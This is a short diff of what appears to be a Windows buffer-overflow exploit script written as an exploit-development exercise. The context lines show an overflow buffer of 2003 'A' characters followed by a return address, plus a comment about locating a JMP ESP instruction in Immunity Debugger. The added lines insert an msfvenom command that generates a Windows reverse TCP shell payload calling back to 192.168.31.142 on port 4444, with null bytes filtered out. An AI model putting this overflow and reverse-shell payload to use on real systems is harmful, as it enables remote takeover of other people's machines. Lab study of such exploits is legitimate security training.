@@ -47,6 +47,9 @@ shell = "A" * 2003 + "\xaf\x11\x50\62
 
 #now after execution search the address into immunity and make sure you get jmp esp and set a break point on it to stop the program for our purpos
 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.31.142 LPORT=4444 EXITFUNC=thread -f c --platform windows -b “\x00”
+
+
 
 
 
